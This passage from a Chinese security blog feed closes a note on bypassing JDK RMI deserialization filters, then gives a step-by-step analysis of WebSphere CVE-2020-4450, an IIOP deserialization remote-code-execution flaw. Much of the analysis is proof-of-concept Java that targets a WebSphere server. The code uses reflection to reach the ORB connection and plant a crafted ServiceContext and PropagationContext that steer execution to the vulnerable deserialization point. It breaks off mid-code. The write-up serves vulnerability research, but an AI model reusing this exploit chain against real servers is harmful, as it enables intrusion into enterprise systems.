<span class="token punctuation">(</span>var0<span class="token punctuation">.</span><span class="token function">depth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> 20L<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Status<span class="token punctuation">.</span>REJECTED<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        Class <span class="token class-name">var2</span> <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">serialClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var2<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//白名单校验，只有下列类允许被反序列化，不在白名单内的类在反序列化时会抛出异常。</span>                <span class="token keyword">return</span> String<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">!=</span> var2 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Proxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UnicastRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIClientSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIServerSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ActivationID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">?</span> Status<span class="token punctuation">.</span>REJECTED <span class="token operator">:</span> Status<span class="token punctuation">.</span>ALLOWED<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> var0<span class="token punctuation">.</span><span class="token function">arrayLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> 0L <span class="token operator">&amp;&amp;</span> var0<span class="token punctuation">.</span><span class="token function">arrayLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> 1000000L <span class="token operator">?</span> Status<span class="token punctuation">.</span>REJECTED <span class="token operator">:</span> Status<span class="token punctuation">.</span>UNDECIDED<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> Status<span class="token punctuation">.</span>UNDECIDED<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>所以Proxy加上AnnotationInvocationHandler的形式就不再适用了，</p><p>![2](高版本 JDK RMI JNDI Bypass 学习笔记/2.png)</p><p>如果想要在高版本 JDK的限制下 成功反序列化Rce 那么利用连就只能从白名单里的这些类中找</p><p>未完待续</p><p>参考链接</p><p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p><p><a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank" rel="noopener">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a></p><p><a href="https://www.anquanke.com/post/id/211722" target="_blank" rel="noopener">https://www.anquanke.com/post/id/211722</a></p><p><a href="http://openjdk.java.net/jeps/290" target="_blank" rel="noopener">http://openjdk.java.net/jeps/290</a></p><p><a href="https://blog.csdn.net/u011721501/article/details/78555246" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/78555246</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
            <tag> RMI </tag>
            
            <tag> JNDI </tag>
            
            <tag> RPC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析</title>
      <link href="/2020/09/23/websphere-cve-2020-4450-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-du-fen-xi/"/>
      <url>/2020/09/23/websphere-cve-2020-4450-fan-xu-lie-hua-yuan-cheng-dai-ma-zhi-xing-lou-dong-shen-du-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="WebSphere-CVE-2020-4450-反序列化远程代码执行漏洞深度分析"><a href="#WebSphere-CVE-2020-4450-反序列化远程代码执行漏洞深度分析" class="headerlink" title="WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析"></a>WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析</h1><h2 id="WebSphere简介"><a href="#WebSphere简介" class="headerlink" title="WebSphere简介"></a>WebSphere简介</h2><p>WebSphere 是 IBM 的软件平台。它包含了编写、运行和监视全天候的工业强度的随需应变 Web 应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。WebSphere 提供了可靠、灵活和健壮的软件。</p><p>WebSphere Application Server 是该设施的基础，其他所有产品都在它之上运行。WebSphere Process Server 基于 WebSphere Application Server 和 WebSphere Enterprise Service Bus，它为面向服务的<a href="https://baike.baidu.com/item/体系结构" target="_blank" rel="noopener">体系结构</a> (SOA) 的模块化应用程序提供了基础，并支持应用业务规则，以驱动支持业务流程的应用程序。高性能环境还使用 WebSphere Extended Deployment 作为其基础设施的一部分。其他 WebSphere 产品提供了广泛的其他服务。</p><p>WebSphere 是一个模块化的平台，基于业界支持的开放标准。可以通过受信任和持久的接口，将现有资产插入 WebSphere，可以继续扩展环境。WebSphere 可以在许多平台上运行，包括 Intel、Linux 和 z/OS。</p><p>WebSphere 是随需应变的电子商务时代的最主要的软件平台，可用于企业开发、部署和整合新一代的电子商务应用，如<a href="https://baike.baidu.com/item/B2B" target="_blank" rel="noopener">B2B</a>，并支持从简单的网页内容发布到企业级事务处理的商业应用。WebSphere 可以创建电子商务站点， 把应用扩展到联合的移动设备， 整合已有的应用并提供自动业务流程。</p><h2 id="WSDL简介"><a href="#WSDL简介" class="headerlink" title="WSDL简介"></a>WSDL简介</h2><p>WSDL是一个用于精确描述Web服务的文档，WSDL文档是一个遵循WSDL-XML模式的XML文档。WSDL 文档将Web服务定义为服务访问点或端口的集合。在 WSDL 中，由于服务访问点和消息的抽象定义已从具体的服务部署或数据格式绑定中分离出来，因此可以对抽象定义进行再次使用。消息，指对交换数据的抽象描述；而端口类型，指操作的抽象集合。用于特定端口类型的具体协议和数据格式规范构成了可以再次使用的绑定。将Web访问地址与可再次使用的绑定相关联，可以定义一个端口，而端口的集合则定义为服务。<br>    一个WSDL文档通常包含8个重要的元素，即definitions、types、import、message、portType、operation、binding、service元素。这些元素嵌套在definitions元素中，definitions是WSDL文档的根元素。 </p><h2 id="漏洞原理深度分析"><a href="#漏洞原理深度分析" class="headerlink" title="漏洞原理深度分析"></a>漏洞原理深度分析</h2><p>网上最早披露的漏洞相关详情信息是在<a href="https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere此篇博文中进行讲解的。" target="_blank" rel="noopener">https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere此篇博文中进行讲解的。</a></p><p>根据文中的部分描述，此漏洞是由IIOP协议上的反序列化造成，所以我们本地需要起一个IIOP客户端来向WebSphere发送请求从而触发漏洞。</p><p>代码如下所示</p><pre class=" language-java"><code class="language-java">Hashtable env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>INITIAL_CONTEXT_FACTORY<span class="token punctuation">,</span> <span class="token string">"com.ibm.websphere.naming.WsnInitialContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>PROVIDER_URL<span class="token punctuation">,</span> <span class="token string">"iiop://172.16.45.148:2809"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>InitialContext initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>initialContext<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>根据文章中的描述我们来到TxServerInterceptor这个拦截器的receive_request方法中，根据博主的描述在到达反序列化点之前的执行路径如下所示</p><p>![1](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/1.png)</p><p>我们先从TxServerInterceptor的receive_request方法开始调试。</p><p>我们运行IIOP客户端，向WebSphere发送请求，但是很快就发现执行链中的第二个断点并没有被执行，我们来看下源码</p><p>![2](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/2.png)</p><p>从源码中看出，想要执行到调用TxInterceptorHelper的demarshalContext()方法处要满足两个判断，即<code>validOtsContext=true</code> 和<code>TxProperties.SINGLE_PROCESS=ture</code></p><p>首先先看validOtsContext是在哪里进行的赋值</p><p>![3](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/3.png)</p><p>可以看到validOtsContext的值为ture 或者false 取决于serviceContext的值是否为空。</p><p>经过调试发现不出所料serviceContext的值为空，那么现在就面临第一个问题就是要让程序执行到指定位置，所以我们要想办法为serviceContext赋一个值。</p><p>![4](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/4.png)</p><p>所以我们跟入<code>serviceContext = ((ExtendedServerRequestInfo)sri).getRequestServiceContext(0)</code>这行代码，深度挖掘这个<code>((ExtendedServerRequestInfo)sri).getRequestServiceContext(0)</code>这个方法的返回值我们可不可控，判断一下这个serviceContext的值是否获取自IIOP客户端发送的数据。</p><p>下面列出分析serviceContext值来源的调用链</p><p>![5](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/5.png)</p><p>最终来到ServiceContextList的getServiceContext方法，一下是该方法的具体实现</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> ServiceContext <span class="token function">getServiceContext</span><span class="token punctuation">(</span><span class="token keyword">int</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ServiceContext var2 <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">synchronized</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var4 <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>serviceContexts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>serviceContexts<span class="token punctuation">[</span>var4<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>                var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>serviceContexts<span class="token punctuation">[</span>var4<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> var2<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这里的var1是<code>((ExtendedServerRequestInfo)sri).getRequestServiceContext(0)</code>的参数也就是0，这里会循环遍历ServiceContexts, 如果其中有一个ServiceContext的id值为0，则会为var2赋值并返回。也就是说我们要想办法让ServiceContext的id值为0。那么此时我们就要看这里的serviceContexts究竟又是在哪里尽心的赋值。</p><p>经过对代码的回溯，最终找到了这个为serviceContexts赋值的点，在RequestMessage的read方法中，这里会生成ServiceContext对象并为其id值进行复制，而这里的id值就是又客户端传递来的序列化数据中读取到的，那么就意味着该值可控。</p><p>![6](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/6.png)</p><p>那么我们就要回到POC的构造中来思考怎么设置ServiceContext的值。</p><p>根据奇安信 观星实验室的iswin大佬给的思路，在将构造好的ServerContext封装进请求数据之前需要先进行一次查询操作，从而让数据初始化</p><p>这是初始化之前其中的_context对象是null</p><p>![7](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/7.png)</p><p>当执行完一次查询操作后_context对象就成功被初始化了</p><p>![8](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/8.png)</p><p>后续的一些操作就主要围着_context对象中的属性来进行操作了，经过一番查找最终锁定了一个可以操作的ServerContext对象的属性，</p><p>贴一下该属性所在的位置，这里我精简掉了其余的暂时用不到的属性。</p><p>![9](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/9.png)</p><p>这里并没有显示该属性的类型，所以去Connection类中查找对应的属性，确定其类型</p><p>![10](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/10.png)</p><p>现在我们的目标明确了，就是要向该属性赋一个ServiceConetxt的值，这里就需要用到一系列的反射了,截止到orb属性为止都可以通过简单的反射来进行获取代码如下所示</p><pre class=" language-java"><code class="language-java">Field f_defaultInitCtx <span class="token operator">=</span> initialContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"defaultInitCtx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f_defaultInitCtx<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        WsnInitCtx defaultInitCtx <span class="token operator">=</span> <span class="token punctuation">(</span>WsnInitCtx<span class="token punctuation">)</span> f_defaultInitCtx<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>initialContext<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field f_context <span class="token operator">=</span> defaultInitCtx<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_context"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f_context<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CNContextImpl _context <span class="token operator">=</span> <span class="token punctuation">(</span>CNContextImpl<span class="token punctuation">)</span> f_context<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>defaultInitCtx<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field f_corbaNC <span class="token operator">=</span> _context<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_corbaNC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f_corbaNC<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        _NamingContextStub _corbaNC <span class="token operator">=</span> <span class="token punctuation">(</span>_NamingContextStub<span class="token punctuation">)</span> f_corbaNC<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>_context<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field f__delegate <span class="token operator">=</span> ObjectImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"__delegate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f__delegate<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ClientDelegate clientDelegate <span class="token operator">=</span> <span class="token punctuation">(</span>ClientDelegate<span class="token punctuation">)</span>f__delegate<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>_corbaNC<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field f_ior <span class="token operator">=</span> clientDelegate<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"ior"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f_ior<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        IOR ior <span class="token operator">=</span> <span class="token punctuation">(</span>IOR<span class="token punctuation">)</span> f_ior<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>clientDelegate<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field f_orb <span class="token operator">=</span> clientDelegate<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"orb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f_orb<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ORB orb <span class="token operator">=</span> <span class="token punctuation">(</span>ORB<span class="token punctuation">)</span>f_orb<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>clientDelegate<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后根据iswin大佬文章中给的相关代码 可以通过反射获取orb属性中存储的GIOPImpl对象的getConnection方法，然后通过getConnection方法在获取我们所需要的Connection对象</p><p>代码如下</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//通过反射获取的orb属性 调用其getServerGIOP方法获取封装在其中的GIOPImpl对象</span>GIOPImpl giopimpl <span class="token operator">=</span> <span class="token punctuation">(</span>GIOPImpl<span class="token punctuation">)</span> orb<span class="token punctuation">.</span><span class="token function">getServerGIOP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//反射获取该GIOPImpl对象的getConnection方法</span>Method getConnection <span class="token operator">=</span> giopimpl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getConnection"</span><span class="token punctuation">,</span> com<span class="token punctuation">.</span>ibm<span class="token punctuation">.</span>CORBA<span class="token punctuation">.</span>iiop<span class="token punctuation">.</span>IOR<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Profile<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> com<span class="token punctuation">.</span>ibm<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>corba<span class="token punctuation">.</span>ClientDelegate<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>getConnection<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用getConnection方法传入对应参数,获取所需的Connection对象。</span>Connection connection <span class="token operator">=</span> <span class="token punctuation">(</span>Connection<span class="token punctuation">)</span> getConnection<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>giopimpl<span class="token punctuation">,</span>ior<span class="token punctuation">,</span>ior<span class="token punctuation">.</span><span class="token function">getProfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>clientDelegate<span class="token punctuation">,</span><span class="token string">"LinShiGong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>根据之前对ServerContext对象的分析，我们需要将它封装进该Connection对象的connectionContext属性中，所以还需要通过反射获取Connection对象的setConnectionContexts方法，并通过该方法将我们实例化好的ServerContext对象存入其中</p><p>代码如下</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//反射获取Connection对象的setConnectionContexts方法</span>Method setConnectionContexts <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"setConnectionContexts"</span><span class="token punctuation">,</span> ArrayList<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>setConnectionContexts<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>接下来我们需要实例化一个ServiceContext对象并将其id值设置为0</p><p>代码如下</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//为了满足ServiceContext构造方法需要的参数，先随意构造一个byte[]</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">}</span><span class="token punctuation">;</span>ServiceContext serviceContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServiceContext</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>接下来通过反射获得的setConnectionContexts方法将ServiceContext对象存入Connection对象中</p><p>代码如下</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//由于setConnectionContexts的参数是一个ArrayList类型所以需要将ServiceContext对象先放入一个ArrayList中</span>ArrayList var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>serviceContext<span class="token punctuation">)</span><span class="token punctuation">;</span>setConnectionContexts<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>connection<span class="token punctuation">,</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//再次进行查询操作</span>initialContext<span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>回到WebSphere这边，继续调试看能否执行到TxInterceptorHelper.demarshalContext方法的位置，可以看到此时serviceContext的值不在为空了，validOtsContext的值也变成的true</p><p>![11](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/11.png)</p><p>可以看到程序现在可以执行到指定位置了，那我们就继续往下走。</p><p>![12](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/12.png)</p><p>进入到demarshalContext方法后又遇到了第二个问题，就是该方法内会对客户端传来的数据进行读取，并封装入一个PropagationContext对像中</p><p>![13](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/13.png)</p><p>这里传入了三个参数然后生成了一个inputStream对象，面对这种问题首先要看这个inputStream读取的数据究竟是哪个参数里面的，所以深入跟进inputStream.read_ulong方法，并最终来到CDRInputStream.read_long方法中，观察代码可知，读取的区域是当前对象的buf属性中的内容，</p><p>![14](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/14.png)</p><p>看了这个buf属性后觉得很眼熟，回头看我们在客户端这边实例化ServiceContext对像时传入的result参数和该属性的值一模一样，由此可知我们需要在客户端实例化ServiceContext时在精心构造一下其所需的第二个参数。</p><p>![15](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/15.png)</p><p>我们要找到与demarshalContext方法对应的marshalContext方法，然后看看该方法是怎么处理数据的，然后我们照着来就行了。</p><p>![16](WebSphere CVE-2020-4450 反序列化远程代码执行漏洞深度分析/16.png)</p><p>根据上面的格式我们自己稍微修改一下</p><p>代码如下</p><pre class=" language-java"><code class="language-java">CDROutputStream outputStream <span class="token operator">=</span> ORB<span class="token punctuation">.</span><span class="token function">createCDROutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>outputStream<span class="token punctuation">.</span><span class="token function">putEndian</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Any any <span class="token operator">=</span> orb<span class="token punctuation">.</span><span class="token function">create_any</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//生成一个PropagationContext对象。</span>PropagationContext propagationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PropagationContext</span><span class="token punctuation">(</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">TransIdentity</span><span class="token punctuation">(</span>null<span class="token punctuation">,</span>null<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">otid_t</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">TransIdentity</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        any<span class="token punctuation">)</span><span class="token punctuation">;</span>PropagationContextHelper<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>outputStream<span class="token punctuation">,</span>propagationContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出为byte数组</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> outputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ServiceContext serviceContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServiceContext</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>ArrayList var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>serviceContext<span class="token punctuation">)</span><span class="token punctuation">;</span>setConnectionContexts<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>connection<span class="token punctuation">,</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>initialContext<span class="token 